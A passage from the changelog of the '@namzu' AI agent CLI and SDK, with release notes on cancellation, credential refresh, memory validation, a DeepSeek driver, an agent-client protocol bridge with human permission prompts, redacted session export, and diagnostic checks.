  transport where supported or refuses a result that arrived after cancellation.
  Existing zero-argument provider implementations remain valid.

  The interactive provider picker now cancels model discovery, credential checks
  and subscription sign-in when the operator backs out, supersedes the work, or
  leaves the screen. Late results cannot reopen an old model step, accept a
  credential, re-probe the application, or persist a subscription credential
  after cancellation. Model listing and credential probing both settle after a
  three-second bound even when a custom provider ignores its signal.

  Between-turn and durable-resume subscription refreshes now settle on caller
  cancellation and apply one 30-second bound across the token request and response
  body. Refreshes in one session are serialized and re-read their source at the
  head of the queue, preventing a later stale caller from downgrading a token
  published by an earlier one. Namzu's credential file uses an exact conditional
  replacement under a cross-process, atomically published lock; an external
  rotation or logout wins, and an uncertain publication refuses instead of using
  an uncommitted refresh. Borrowed macOS Keychain credentials are read-only: a
  changed or removed entry wins, and a successful refresh of an unchanged entry
  remains session-local.

- dd40b56: Preserve pasted images when a prompt is submitted while another turn is running.

  All model-bound prompts now enter one FIFO queue, and the queue carries the
  complete text-and-image submission into both the provider request and durable
  conversation. This also prevents a new idle-edge submission from bypassing an
  older queued prompt while the queue-drain effect is being scheduled. Switching
  conversations discards pending prompts even when the old turn settled behind
  the picker before the queue pump could start them.

- 741c18c: Refuse to resume, continue, fork, or mutate conversations that are already archived, closed, or outside the current workspace. Exact `--resume <id>` now resolves the durable id independently of the recent-conversation limit, while archived history remains readable for inspection and export.
- 63e8148: Refuse an unreadable or structurally invalid persistent-memory index instead
  of treating it as an empty store.

  `DiskMemoryStore` now validates every persisted index entry before publishing
  it into the live projection. Invalid JSON, newer schema data, unrecognized or
  duplicate memory IDs, wrong field types, unknown statuses and invalid
  timestamps leave the original index byte-identical and make the operation
  fail. Once the durable file is repaired, the same store instance may retry.

  The CLI's memory tools inherit the fail-closed boundary, so `save_memory`
  cannot overwrite an index the current SDK could not safely understand.

- a1fe55e: Refuse a permanently unusable subscription refresh grant before provider work instead of repeatedly retrying it and sending the expired access token. The live session caches the refusal only for the exact credential, adopts a later login or external rotation, and treats deletion from the authoritative store as logout rather than continuing with an in-memory token.
- 487ed4e: Repair provider-invalid tool history chronologically before the first model
  call. Abandoned calls receive an explicit unknown-outcome error result while
  checkpoint calls still owned by approval or crash recovery retain their exact
  assistant state and execute only through that authority path. The SDK adds the
  public `repairToolMessageHistory` projection and `message_history_repaired`
  `RunEvent`; CLI transcripts surface the measured repair without exposing tool
  content.
- c933952: Return exact verifier token usage from `compactNow` and `compactRegion`. Every non-null `CompactionResult` now includes `usage`; an all-zero record means the pass made no verifier request. Hosts that account for provider work should include this record in their own ledger.

  After `/compact`, remove the old context-fill gauge only after the replacement conversation has been durably published. A pending or failed replacement keeps the old transcript and measurement; a successful replacement remains unmeasured until the next model request reports the new context size.

- fd280c0: Make the first structured-memory search after process startup see records that
  were already persisted on disk.

  `buildMemoryTools(store)` is a new store-authoritative composition whose
  `search_memory` tool awaits the store's asynchronous `list()` boundary. This is
  the default for lazy and disk-backed stores. The existing
  `buildMemoryTools(store, index)` form remains index-authoritative and performs
  no store read, preserving custom pre-populated or independently managed search
  indexes.

  The CLI now uses the store-authoritative form for both its main and delegated
  agent registries, so a fresh session can recall prior run memories without an
  unrelated read or write first warming the in-memory index.

- ee4fd1d: Persist provider-native reasoning state with the exact provider, model, and fallback-chain member that produced it. Same-route sessions now replay native reasoning after restart, `/resume`, and `/fork`; a model, provider, or member switch keeps portable assistant/tool history without sending foreign native reasoning metadata.

  `@namzu/sdk` adds `ProviderRoute`, `AssistantMessageSource`, optional assistant source/replay fields, and the provider request/stream/response plumbing. Fallback and forced-final turns now attribute provenance and cost to the member that actually answered.

  `@namzu/cli` preserves and validates the additive assistant source shape in stateless and durable history.

  **What breaks in the drivers:** hand-built assistant reasoning and histories written by earlier versions do not carry a validated route-bound replay envelope, so they are no longer emitted as native `reasoning_content` or signed thinking. Their portable assistant text and tool exchanges remain available, but an upstream that requires native metadata for an old tool continuation may refuse that request; compact or start a fresh conversation before continuing such legacy history. Preserve the complete assistant message returned by new runs, including `source.replayState`. Direct callers of the exported DeepSeek `toDeepSeekMessages` converter must also pass the target `ProviderRoute` as its second argument.

- 5a5f48e: Render agent-authored conversation, permission and live-tool text through a
  terminal-safe display projection. Source controls and directional formatting
  remain exact in model history, persistence, exports and clipboard copies, but
  appear as visible escapes instead of executing or reordering terminal output.
- c8753a7: Propagate run cancellation through every plugin hook and preserve cancellation
  when it occurs before the iteration loop. Hook code now receives a signal that
  combines the run lifetime with its hook deadline, and a hook that ignores that
  signal can no longer keep the run waiting.

  Make CLI session shutdown cancel and settle in-flight sends, manual compaction,
  and durable resumes before external tool servers are closed. Calls made after
  session close now refuse before starting provider work.

- 9b9a1e3: Keep untrusted project authority out of CLI startup.

  Interactive and headless launches now resolve only user, environment and
  managed configuration before the folder trust decision. Project config,
  project commands and project instructions activate together after trust, using
  the actual `--cwd` target for headless runs. Invalid project config can no
  longer outrun an untrusted-folder refusal, and the canonical approved directory
  is pinned so a later symlink swap cannot redirect the launch. Headless sessions
  also now receive their configured sandbox policy instead of silently dropping
  it.

- Updated dependencies [bebad69]
- Updated dependencies [f3bf47b]
- Updated dependencies [27667cc]
- Updated dependencies [fd5fcea]
- Updated dependencies [777b444]
- Updated dependencies [780a471]
- Updated dependencies [74705e2]
- Updated dependencies [0e678a8]
- Updated dependencies [753b037]
- Updated dependencies [45e8f56]
- Updated dependencies [3c61c94]
- Updated dependencies [f528acd]
- Updated dependencies [0a7bd58]
- Updated dependencies [924df56]
- Updated dependencies [ce8cd61]
- Updated dependencies [94d3306]
- Updated dependencies [45d7014]
- Updated dependencies [99127d8]
- Updated dependencies [2d16ca2]
- Updated dependencies [a3a632f]
- Updated dependencies [7a45aa4]
- Updated dependencies [79faa99]
- Updated dependencies [99ff79e]
- Updated dependencies [ade6c85]
- Updated dependencies [5581dde]
- Updated dependencies [8de3582]
- Updated dependencies [fd6683b]
- Updated dependencies [15f8ee4]
- Updated dependencies [43620d9]
- Updated dependencies [63e8148]
- Updated dependencies [317360a]
- Updated dependencies [487ed4e]
- Updated dependencies [c933952]
- Updated dependencies [fd280c0]
- Updated dependencies [ee4fd1d]
- Updated dependencies [192d90e]
- Updated dependencies [143b8d9]
- Updated dependencies [c8753a7]
- Updated dependencies [1792bcb]
- Updated dependencies [bb8cb05]
- Updated dependencies [095c936]
- Updated dependencies [c6ebb31]
- Updated dependencies [bf26200]
  - @namzu/sdk@31.0.0
  - @namzu/openai@1.4.0
  - @namzu/deepseek@1.0.0
  - @namzu/anthropic@4.0.0
  - @namzu/ollama@2.2.1
  - @namzu/openrouter@2.3.1

## 12.1.0

### Minor Changes

- 7050dd4: Add `@namzu/deepseek`, and stop dropping reasoning when a stream is collected.

  **A new driver, and a separate package on purpose.** DeepSeek's endpoint is OpenAI's Chat Completions shape, so pointing `@namzu/openai` at it with a `baseURL` looks like it should work. It does not, and the reason is thinking mode: it is **on by default**, the chain of thought comes back in a `reasoning_content` field that wire has no concept of, and the vendor requires that field replayed on every later turn once tool calls are in play. A driver that does not know about it drops the model's reasoning on every call.

  `@namzu/deepseek` maps `ThinkingConfig` one-to-one onto the vendor's own `adaptive | enabled | disabled`, streams reasoning through `delta.reasoning` — the same channel `@namzu/anthropic` uses, so a host that renders one renders the other — and replays it automatically. Callers pass the assistant message back and the field goes with it.

  It **refuses** two things the vendor accepts and applies to nothing: `effort` (this wire validates `thinking.type` and ignores any effort beside it) and the sampling parameters while thinking is on. Both were measured against the live API rather than read off the documentation. `samplingInThinkingMode: 'ignore'` opts out of the second.

  It carries no price rows, deliberately: the vendor charges twice as much during peak UTC hours, and a static table has no hour in it.

  **`collectChatCompletion` dropped reasoning blocks** (`@namzu/sdk`). `delta.reasoning` existed, `AssistantMessage.reasoning` is documented as replayed verbatim, and the run loop assembled it correctly — but this helper, which every non-streaming caller goes through, threw it away. So the same stream produced a message with reasoning through one route and without it through the other, and a vendor that needs the blocks back was sent a message that had lost them. It now buckets them by index exactly as the run loop does. This affects `@namzu/anthropic` users too.

  **The CLI ships the driver** (`@namzu/cli`), so `namzu --provider deepseek` works on a fresh install with `DEEPSEEK_API_KEY` set. That is a fifth bundled driver and a slightly larger install.

  Models are `deepseek-v4-flash` and `deepseek-v4-pro`. `deepseek-chat` and `deepseek-reasoner` were discontinued on 2026-07-24 and resolve to nothing.

### Patch Changes

- Updated dependencies [7050dd4]
  - @namzu/deepseek@0.1.0
  - @namzu/sdk@30.2.0

## 12.0.4

### Patch Changes

- Updated dependencies [03e363c]
  - @namzu/sdk@30.1.0
  - @namzu/files@1.1.0
  - @namzu/anthropic@3.4.0
  - @namzu/ollama@2.2.0
  - @namzu/openai@1.3.0
  - @namzu/openrouter@2.3.0

## 12.0.3

### Patch Changes

- b2c005c: Make each README an npm package page rather than the package's manual.

  `@namzu/sdk`'s README was a twenty-four-section architecture tour, 45 KB of it; the others ran to several hundred lines each. That is the right shape for a single-package repository, where the README _is_ the documentation, and the wrong one here — it duplicated a `docs/` tree that already existed, and nothing checked that the two agreed.

  Each README is now what a reader needs in the first minute: what the package is, install with its Node requirement, one working example, and links. The long-form material moved into `docs/` whole — `docs/sdk/architecture.md`, `docs/cli/reference.md`, `docs/packages/<name>.md` — where the doc gates cover it.

  Two documentation defects fell out of the move, both in `@namzu/telemetry`'s session-export example, and both had been shipping: the config field is `redactors` and takes a list, not `redactor` taking one; and `secretRedactor` is a factory that has to be called. The required `destination` field was missing from the example entirely. They surfaced because a README is gated by nothing and `docs/` is compiled against the built SDK.

  No API change.

- Updated dependencies [b2c005c]
- Updated dependencies [5394981]
  - @namzu/sdk@30.0.1
  - @namzu/files@1.0.1
  - @namzu/anthropic@3.3.2
  - @namzu/ollama@2.1.1
  - @namzu/openai@1.2.2
  - @namzu/openrouter@2.2.1

## 12.0.2

### Patch Changes

- e9a5e61: Remove the process-wide logger. A component given no logger now emits nothing instead of writing to your stderr.

  **Removed from `@namzu/sdk`'s public surface:** `getRootLogger` and `configureLogger`. Both shipped `@deprecated` in an earlier minor, naming `installProcessSink` and `createLogger` as their replacements — this release is the removal that window existed for. `Logger` and `getLogCounters`, the other two exports from that module, are unchanged.

  **What broke and what to do.**

  `getRootLogger()` — build your own and pass it where you construct things:

  ```ts
  import { createLogger, installProcessSink, prettySink } from "@namzu/sdk";

  installProcessSink(prettySink(process.stderr), "info");
  const log = createLogger({
    sink: prettySink(process.stderr),
    level: { current: "info" },
    resource: { "service.name": "my-app" },
    scope: "my-app",
  });

  await query({ ...params, runConfig: { ...runConfig, logger: log } });
  ```

  `configureLogger({ level })` — a level was only ever meaningful against a destination, and the destination is now yours. Pass the level to `installProcessSink(sink, level)`, or to `createLogger`'s `level` box, which stays live: assigning `level.current` retunes a logger already handed out.

  Both take a level of type `LevelFilter` (`'debug' | 'info' | 'warn' | 'error' | 'silent'`), which is exported and unchanged.

  **The behaviour change, which no type will catch.** `logger` was always optional on `RunConfig` and on every tool and component config, and omitting it used to mean "write to the process root" — in practice, your stderr, from a library, on a stream your program may be using for its own protocol. It now means `NOOP_LOGGER`: nothing is emitted, and the discard is counted, so `getLogCounters()` still tells you _N calls were thrown away_ rather than _nothing happened_. If your application relied on SDK diagnostics appearing without asking for them, they will stop appearing, and the compiler will not tell you. The field names are unchanged, so passing a logger is the whole migration.

  Installing a process sink no longer reroutes SDK internals on its own. It sets the destination and owns the counter set; what routes through it is the logger you build over it and hand in.

  **Also exported:** `getProcessSinkCounters()`, so a host that builds its own logger can count into the process's set rather than a private one — which is what keeps `getLogCounters()` and `namzu doctor`'s `logging.pipeline` check reporting real numbers.

- Updated dependencies [e9a5e61]
  - @namzu/sdk@30.0.0
  - @namzu/anthropic@3.3.1
  - @namzu/ollama@2.1.0
  - @namzu/openai@1.2.1
  - @namzu/openrouter@2.2.0

## 12.0.1

### Patch Changes

- Updated dependencies [e114fd5]
- Updated dependencies [0ef3e40]
- Updated dependencies [e92b530]
  - @namzu/sdk@29.0.0
  - @namzu/anthropic@3.3.1
  - @namzu/ollama@2.1.0
  - @namzu/openai@1.2.1
  - @namzu/openrouter@2.2.0

## 12.0.0

### Major Changes

- a093e22: Topic ids now begin `top_` instead of `thd_`. From this release `thd_` means only the pre-0.2.0 top-level container that `session/migration/id-prefix.ts` and `session/migration/filesystem.ts` already coerce to `prj_legacy_*` — the Topic layer's own id no longer shares that prefix, closing the ambiguity where two unrelated things wore one prefix and only a path depth told them apart.

  **What breaks, and what to do:**

  - **A minted topic id is now `top_*`.** `generateTopicId()` returns `top_…`; the `TopicId` type is `` `top_${string}` ``. Code that pattern-matches `thd_` on a live topic id, or that pins a literal, needs updating. Code that pattern-matches `thd_` on the _legacy container_ is unaffected and should stay.
  - **`acceptLegacyThreadId` → `acceptLegacyContainerId`** and **`rejectLegacyPrefix` → `rejectLegacyContainerPrefix`.** Behaviour is identical (`acceptLegacyContainerId` also takes a new optional third `windowOpen` argument, defaulting to the existing `WINDOW_OPEN`). The old names remain as `@deprecated` aliases — your code still compiles and warns. Renamed because "Thread" stopped describing what these accept: the pre-0.2.0 container, not the Topic layer.

  **Nothing is removed in this release.** `ThreadId`, `ThreadManager`, `InMemoryThreadStore`, `generateThreadId`, `acceptLegacyThreadId` and `rejectLegacyPrefix` are all still exported and all now carry `@deprecated`. Removal is a later major.

  That is deliberate, and it corrects a mistake this change was originally planned to make. The rename of Thread→Topic marked those names deprecated in source, but that work has never been published: the registry is still on 27.1.0, and its changeset is still unconsumed. So on every version a consumer can actually install, `ThreadManager` is not a deprecated alias — it is the _only_ name, and ordinary code uses it. Deleting it here would have moved a consumer from "works, no warning" straight to "gone", which is a rename with no alias wearing a major's clothes. This release is the first one that can carry the warning; the next major may remove them.

  Note that `ThreadId` now resolves to `` `top_${string}` `` rather than `` `thd_${string}` ``, and `generateThreadId` mints `top_`. An alias that kept the old prefix would hand two different id spaces to one program depending on which name a file happened to import.

  **Existing records migrate on first read; no operator action.** A `session.json` written with `topicId: "thd_x"` is rewritten to `topicId: "top_x"` when `DiskSessionStore` reads it, and durably on the next write-back, via a new `session-store` schema step (2→3) chained after the existing `threadId`→`topicId` field-rename step for any record still at v1. A serialized `RunState` snapshot migrates the same way through `parseRunState` (`RUN_STATE_VERSION` 2→3).

  **No topic-directory rewriter is included, and none is owed.** There is no disk-backed `TopicStore` — `store/topic/memory.ts` is the only implementation — so no `.namzu/…/threads/<thd_x>/` directory has ever been written by a shipped build. The only on-disk artifact naming a topic is the denormalized `topicId` field covered above.

- 9bce045: The denormalized `threadId` field is renamed to `topicId` everywhere it appears
  on an exported shape, and `SessionStore.listSessions` is renamed to
  `listSessionsByTopic`. NZ-TOPIC-01 (a previous minor) renamed the _layer_ to
  Topic and left this field as the one place the retired word still surfaced on
  every shape a consumer types against; this is that rename landing.

  Mechanical edits for every consumer:

  - `session.threadId` → `session.topicId` (same rename on `RunState`,
    `AgentTaskContext`, `BaseAgentConfig`, `CreateSessionParams`,
    `HandoffAssignment`, `RunPersistenceConfig`, `RunContextConfig`/`RunContext`,
    `QueryParams`, `RunStateScope`, `AgentIdentity`, and the CLI's
    `CliSessions`/`RunScope`)
  - `store.createSession({ threadId, ... })` → `store.createSession({ topicId, ... })`
  - `store.listSessions(id, tenantId)` → `store.listSessionsByTopic(id, tenantId)`

  Not touched: the `thd_` id prefix, `ThreadId`/`generateThreadId`/
  `ThreadManager`/`InMemoryThreadStore` (still `@deprecated` aliases from
  NZ-TOPIC-01), and the `Thread*`-named error classes in `session/errors.ts`
  (`ThreadClosedError`, `ThreadNotEmptyError`, `StaleThreadError`) — their
  `details.threadId` field keeps its name too. Renaming those is a separate,
  later change with its own deprecation window; this one is the FK field only.

  No alias ships alongside `topicId` — `SessionStore` is an interface hosts
  implement, and a required method or field cannot be added behind a deprecated
  twin without every implementor already supplying it. NZ-TOPIC-01 already
  carried one minor of warning for the vocabulary; this is the field itself
  moving, and it has to move all at once.

  **Records already on disk migrate on first read, no operator action.**
  `session.json` bumps the shared `session-store` schema from v1 to v2; a
  record written by any older release loads exactly as it did before and comes
  back with `topicId` set from its `threadId`, both in-memory immediately and
  (after the next write to that record) on disk. `project.json`,
  `subsession.json`, `summary.json`, and `messages.jsonl` lines never carried
  the field and the migration step leaves them untouched — verified directly,
  not just by inspection: a naive unconditional version of this migration would
  stamp a stray `topicId: undefined` onto every one of them, and that is
  exactly what the new migration unit test rejects.

  A `RunState` snapshot a host serialized under `RUN_STATE_VERSION: 1` is
  coerced the same way by `parseRunState`. A snapshot written under the new
  `RUN_STATE_VERSION: 2` and read by an SDK still on version 1 is refused with
  `RunStateVersionError`, not partially restored — unchanged behavior, now
  exercised against this specific case.

### Minor Changes

- 5136fbd: The agent-client bridge can now ask a human, read the editor's unsaved buffers, and resume a session. NZ-PEER-07 refused any session whose client could not answer a permission request, which was honest and left the bridge unusable for the case it exists for.

  **The direction the bridge did not have.** A notification is fire-and-forget; a permission prompt is a question the run cannot proceed past. The server now issues JSON-RPC _requests_ — `session/request_permission`, `fs/read_text_file`, `fs/write_text_file` — parks the promise by id, and resolves it when the client's response frame arrives. A response frame used to be ignored, which was right when nothing was ever out on the wire and would now leave a run parked with nobody coming.

  **Three ways the permission exchange fails silently, each closed and each mutation-checked:**

  - Auto-approving instead of asking. `toResumeDecision` maps the outcome to the kernel's own `HITLResumeDecision`, and a denial becomes `reject_tools` with the client's feedback — a `continue` there would run the calls the human just refused. A bare denial gets a default sentence, because an empty `reject_tools` feedback reads to the model as a tool that failed for no reason and it retries.
  - An "approve all" that never takes. `approve_tools` with nothing remembered is indistinguishable from a plain approve, so `approve_all` carries the grant keys and a plain approve carries none — consent is not transferable.
  - An "approve all" that leaks. The latch lives on the SESSION record: a second session from the same process asks again. Hoisting it to the server, or to a module-level variable, would make one person's "stop asking me" cover the next session this process serves — possibly a different repository, editor window, or human.

  An answer the agent cannot parse is treated as a refusal, never as consent.

  **`clientBackedSandbox` makes the editor's buffers the filesystem.** A user with unsaved changes had the agent read disk, see a version nobody is looking at, and patch _that_. A client declaring the `fs` capability answers reads and writes instead. It is a decorator over the existing `Sandbox` — a client-backed object implementing only the file methods would take `bash` away from a session that had it — and it is a `Proxy` rather than a spread, so a member added to `Sandbox` later still reaches the real one. A failed client read rejects rather than falling back to disk: stale text is the exact thing the capability exists to stop.

  **`session/load` resumes.** The prior turns come from the gateway's session store, never from the bridge, and the resumed session answers with the SAME id — a client that asked to resume `ses_x` and got `ses_y` back has to rewrite everything keyed by the old one. A gateway with no store refuses rather than returning an empty history, which a client cannot tell apart from a session that really had no turns. Resuming carries the same permission requirement as creating, because a refusal on `session/new` that `session/load` walks around is not a refusal.

- 70f8d75: An agent-client protocol bridge over stdio, and `namzu acp` to drive it. An editor extension or a CI orchestrator could previously do two things: shell out to the CLI and scrape stdout, or embed this SDK in its own process. This is the third.

  **The command ships in the same change as the bridge, and that is the point.** `MCPServer` and `ServerStdioTransport` are both exported from this package, and nothing in the tree has ever constructed an `MCPServer` — a complete protocol server with no driver, which reads as a supported feature and is not one. A subprocess test spawns the real binary and completes a handshake over a real pipe, so removing the registration fails a test rather than quietly repeating that shape.

  New: `ACPServer`, `toAcpSessionUpdate`, `toAcpStopReason`, the `Acp*` wire types, and `ACP_METHODS` / `ACP_PROTOCOL_VERSION` / `ACP_ERROR_CODES` / `ACP_PERMISSION_CAPABILITY`. Scope is the session core — initialize and capability exchange, session creation, prompting with streamed updates, and cancellation. No new dependency: it runs on the `ServerStdioTransport` this package already had.

  **The method set cannot drift from the pinned version.** `ACP_METHODS` and the server's handler map are authored independently and compared in both directions by a test: a handler nobody advertises fails, and an advertised method with no handler fails. Deriving one from the other would have made that test a tautology.

  **A session is REFUSED when the client declared no permission capability**, naming the capability. Approval routing lands separately; until it does, a session that cannot ask a human anything and runs every tool regardless is not a degraded version of asking — it is the opposite of it, arrived at by omission.

  **Tool calls are rendered by the tool, never by the bridge.** Updates carry a `ToolCallView` from `createToolPresenter`, and a test asserts no module here contains a tool-name comparison — a front end that switched on `'edit'` could never give a diff to a tool it had not heard of. The client-visible command list is `HostCommandRegistry.describe()` verbatim, asserted by registering a command the bridge has never heard of and expecting it to appear.

  An unknown method answers `-32601` and the connection stays open; a malformed frame is survived. Both are asserted against the spawned binary, as is the one that matters most for stdio: **nothing but protocol reaches stdout**, with info-level logging on.

  `namzu acp` builds its session lazily, at the first prompt. `initialize` and `session/new` are how a client discovers what this agent is and what it requires, and neither needs a model — building the session up front made a namzu with no configured credential answer a connection attempt by exiting, so an editor saw a pipe that closed with the reason on a stderr nobody was reading.

- dbd9d3b: `@namzu/telemetry` gains a session export seam: a run's own events, through an ordered redaction chain, to a sink you supply — with one sentence a host can show a user before any of it leaves the machine.

  Spans and metrics describe the agent's execution. They are deliberately not a mirror of the conversation, so an operator who wanted to hand a session to support had no seam at all: they would instrument the store by hand, with no redaction extension point and nothing to disclose.

  New exports: `createSessionExportListener`, `describeSessionExport`, `secretRedactor`, `CONTENT_BEARING_EVENT_TYPES`, and the `SessionExportSink` / `SessionExportRedactor` / `SessionExportRecord` / `SessionExportConfig` / `SessionExportListener` types. The listener is assignable to the SDK's `RunEventListener`, so it attaches to `query({ onEvent })` with no new hook. The record wraps `RunEvent` verbatim rather than flattening it into an export-shaped copy — a second definition of every event in the kernel is one that can drift, and the drifted one would be what an operator reads during an incident.

  **A redactor may refuse, and a refusal never falls open.** Returning `null` drops the record and stops the chain; a redactor that THROWS also drops it, and the un-redacted record is never emitted as a fallback. The exception does not escape into the run either. `emit` is fire-and-forget, so a slow destination cannot stall a turn, and a throwing sink is counted apart from a refusing redactor — "the redactor refused" and "the collector is down" send an operator to different places.

  **The disclosure cannot disagree with the filter.** `describeSessionExport` names the destination, the event types, the redactor count, and whether conversation text is included — and that last one is derived from `eventTypes` rather than declared beside them. It returns a distinct sentence when export is off, because one that read the same in both states would tell a user nothing.

  In `@namzu/cli`: a `telemetry.sessionExport` config block (`destination`, `eventTypes`, `redactors`), the disclosure emitted at boot under `namzu.telemetry.status`, and a `telemetry.session-export` doctor row that names the destination and the redactor count.

  Two refusals rather than degradations. If `sessionExport` is configured and `@namzu/telemetry` is not installed, the run does not start — continuing would mean the session happens and the record the operator was counting on does not exist. And a malformed `sessionExport` block is dropped whole rather than field by field, because a mistyped `redactors` read leniently would leave export ON with redaction silently OFF; dropping it makes the boot line read "off", which is visible.

  Omitting `redactors` installs the shipped `secrets` redactor. Turning redaction off takes an explicit `[]`.

- 9b053ba: New run event `compaction_tool_results_cleared`, carrying `clearedCount`, `charsReclaimed`, `reclaimedTokens` and `reliefWasEnough`. It reaches the SSE stream as `compaction.tool_results_cleared`, the run reporter, `transcript.jsonl`, and the CLI's context line. A2A maps it to `null` alongside the other two compaction events: which of this runtime's context-relief strategies fired is a property of how it manages its own window, and a peer modelling a task lifecycle can act on none of them.

  Clearing oversized tool results is the cheapest and most common context-relief path, and it was the only one that emitted nothing. It edits the conversation irrecoverably — `tool_result` bodies are replaced in place — so a host reading a transcript saw results it no longer had and no record of why, while both summarization outcomes were already on the wire.

  It fires on **both** branches. `reliefWasEnough: false` means the clear happened, was insufficient, and a summarization followed: the history took two edits in one pass, and a reader who saw only the `compaction_completed` would attribute the whole loss to it.

- c844507: Attachments persist content-addressed, over a real `@namzu/files` driver.

  `@namzu/files` shipped six drivers and had no consumer in this repo — a package the estate could import and nothing here could point at. This is the pointing: the local driver, wired to the attachment seam the SDK added, in the one host that actually attaches things.

  Addressed by content **and media type**, not by content alone. The same bytes declared `image/png` once and `application/pdf` later are two different claims about what they are, and the SDK's resolver refuses a ref whose stored media type disagrees with the message. Keying on bytes alone would make the second `put` return the first ref, and every message using it would then be refused — a dedup that manufactures the exact mismatch the check exists to catch.

  The media type is stored in a sibling file rather than inferred, because the resolver's check needs the store to be able to _report_ what it holds: a store that could only echo back what a caller claimed could never catch a mismatch. A ref with bytes and no media type resolves to nothing rather than to a guess.

  `/skills` is now declined from the kernel rather than colliding with it. The kernel's version lists what a registry holds; this host's discovers skills from disk, marks which are active, and shows a refused one with its reason. Both are correct for their audience. `HOST_OWNED_COMMAND_NAMES` names each such case in writing — deliberately a list of exceptions rather than a precedence rule, since first-wins or last-wins would make an _accidental_ collision silent, which is what the collision error exists to prevent.

- 8e5d3f6: Add `loadConfigWithProvenance` so the config cascade records which source won each key

  `mergeConfigs` used to be `Object.assign` across `DEFAULT_CONFIG`, `~/.namzu/config.yaml`, `namzu.config.json` and the `NAMZU_*` environment scan — the last writer won and nothing recorded who it was. `loadConfigWithProvenance(opts?)` now returns `{ config, provenance }`, where `provenance` maps each key of the resolved config to a `ConfigSource`:

  - `{ kind: 'default' }`
  - `{ kind: 'user-file', path }`
  - `{ kind: 'project-file', path }`
  - `{ kind: 'env', variable }` — names the exact `NAMZU_*` variable, not just "env"

  A key that no source set is absent from `provenance` entirely — it is never fabricated as `{ kind: 'default' }`, since `DEFAULT_CONFIG` does not carry every field (`sandbox` has none today).

  `loadConfig` keeps its exact existing signature, `(opts?: LoadConfigOptions) => NamzuCliConfig` — it is now implemented as `loadConfigWithProvenance(opts).config`, so the two cannot drift apart, and no existing consumer of `loadConfig` sees any behavior change.

  New exports from `@namzu/cli`: `loadConfigWithProvenance`, `ConfigProvenance`, `ConfigSource`.

  This is groundwork for the CLI's boot narrative (`namzu.config.resolved`), which will use `provenance` to summarize where each setting came from at startup — that rendering is not part of this change.

- 6001cac: The command list is what this host owns plus whatever the kernel's registry
  reports, instead of one hardcoded array.

  `SLASH_COMMANDS` was a literal, and nothing a capability added could reach
  the operator without editing that file. The coupling had already escaped
  the TUI: two headless commands imported the array for a name list, so a
  name they did not know went to the MODEL as prose — both a wrong answer and
  a tool call nobody asked for.

  `CLI_LOCAL_COMMANDS` now holds only what this host genuinely owns — a
  transcript, a picker, a login, an expand — and `mergeHostCommands` appends
  the registry's. `/agents` and `/tasks` are the kernel's now, and
  `SlashContext.agentIds` is gone: the roster is the kernel's fact, and the
  CLI carrying a second copy meant two answers to one question that could
  disagree.

  A name claimed by both throws at merge time naming it, rather than letting
  local win quietly. One of the two would never run, which one depends on
  merge order, and neither the kernel nor the host author would ever see it.

  Dispatch is a new `SlashAction` kind rather than an async action, because
  the registry's handlers read stores and this union is synchronous — naming
  the dispatch as a result keeps that boundary where it is, and the App's
  exhaustive `never` default still fails the build for an unhandled kind.

- 4b4e039: Add a `runtime.invariants` row to `namzu doctor`

  Reads `@namzu/sdk`'s new module-attributed invariant registry (`InvariantRegistry`, NZ-BOOT-03) and reports what this build claims about its own live state: the registered set, each invariant's outcome right now, and its accumulated violation counter.

  `unknown` — a check that could not be evaluated, which is what both of the SDK's shipped invariants correctly answer outside a live run, since `namzu doctor` has no compaction pass or run claim to point them at — is reported as `inconclusive`, never `pass`. Any `violated` invariant fails the row, and a failed row fails the whole report (`exit 1`, same as any other doctor check).

  **What this means for a script that runs `namzu doctor` and checks its exit code:** on a normal machine, with no run in flight, the new row will read `inconclusive` rather than `pass`, which — per this command's existing exit-code table — moves the report's exit code to `69` unless something else already failed it to `1`. This is new for any caller that previously got `0` from a clean `namzu doctor` run outside of an active session.

  New doctor check: `invariantsCheck` (id `runtime.invariants`), added to `builtInDoctorChecks`. New export: `describeInvariants(registry)`, so a host can drive its own `InvariantRegistry` rather than the process-wide singleton.

- a660710: Extract the tri-state optional-package probe, and probe all four optional capabilities in `namzu doctor`

  `doctor/checks/telemetry.ts`'s resolve-then-import probe — the one that tells a genuinely absent `@namzu/telemetry` apart from one that is installed and throws on load — only ever covered telemetry. `@namzu/sandbox`, `@namzu/files` and `@namzu/computer-use` had no equivalent check, so a sandbox whose native binding failed to load in a container image was invisible to `namzu doctor`: nothing probed it, so nothing could report `fail`.

  New in `@namzu/cli`:

  - `probeOptionalPackage(specifier): Promise<CapabilityProbe>` — the extracted probe, at `context/capabilities.ts`. Never throws; every resolve/import failure becomes a `CapabilityProbe` value.
  - `CapabilityProbe` — `{ state: 'present', specifier, version }` (version read from the nearest `package.json` above the resolved entry file, not through a possibly-restrictive `exports` map), `{ state: 'absent', specifier }`, or `{ state: 'broken', specifier, error }`.
  - `NAMZU_OPTIONAL_CAPABILITIES` — the four optional packages namzu runs without: `@namzu/sandbox`, `@namzu/files`, `@namzu/computer-use`, `@namzu/telemetry`.
  - `probeCapabilities(): Promise<readonly CapabilityProbe[]>` — probes all four in parallel; never rejects.
  - Three new doctor checks — `sandboxInstalledCheck`, `filesInstalledCheck`, `computerUseInstalledCheck` — registered in `builtInDoctorChecks` alongside the existing `telemetryInstalledCheck`, all now built over the same probe.

  `describeInstalledPackage` and `telemetryInstalledCheck` keep their exact exported signatures and status mapping; every existing test in `doctor/checks/__tests__/telemetry.test.ts` passes unmodified. A broken optional package still reports doctor status `fail`; an absent one still reports `skipped` and leaves the doctor's exit code at `0` — `builtInDoctorChecks` gaining three checks changes no existing row and cannot move a healthy machine off exit `0`.

  One wording change, needed because `describeInstalledPackage` now backs four packages instead of one: a `broken` package's remediation text used to read "...or remove it if you are not using **telemetry**...", regardless of which specifier was actually broken. It now reads "...or remove it if you are not using **it**...". No test asserted the old literal string; a caller matching on it should switch to matching the surrounding sentence instead.

  No boot-path emission yet — the boot narrative's `capability` line consumes this probe in a follow-up change.

- f2a7375: `namzu doctor` now reports what the log pipeline did to this process's records: how many never reached the sink, how many had a credential redacted, and how many were shed or truncated by the size caps. It fails — non-zero exit — when records were dropped, and reports `inconclusive` rather than a green row when no sink was installed at all.

  New SDK export `getLogCounters(): LogSinkCounters | undefined`. `undefined` means no host claimed the process's log destination, so nothing measured those records; it is deliberately not a zeroed set, which would read as "nothing was dropped, nothing was redacted" about a process where neither was ever checked.

